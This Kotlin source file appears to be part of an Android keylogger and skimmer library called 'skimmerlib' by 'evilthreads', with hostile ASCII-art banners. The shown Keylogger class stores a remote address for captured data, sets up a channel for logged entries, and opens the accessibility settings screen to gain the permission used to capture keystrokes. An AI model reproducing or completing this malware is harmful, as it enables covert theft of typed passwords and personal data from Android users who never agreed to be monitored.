package com.evilthreads.skimmerlib

import android.content.Context
import android.content.Intent
import android.preference.PreferenceManager
import kotlinx.coroutines.channels.Channel
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class Keylogger{
    companion object Config{
/*        val httpClient = HttpClient(Android) {
            install(JsonFeature){ serializer = JacksonSerializer() }
        }*/
        val KEY = "address"

        val channel = Channel<KeyloggerEntry>()

        fun Context.initKeylogger(addr: String) = PreferenceManager.getDefaultSharedPreferences(this).edit().apply { this.putString(KEY, addr) }.apply()

        fun Context.address() = PreferenceManager.getDefaultSharedPreferences(this).getString(KEY, "")

        fun requestPermission(ctx: Context){
            val intent = Intent().apply{
                action = android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            ctx.startActivity(intent)
        }
    }
}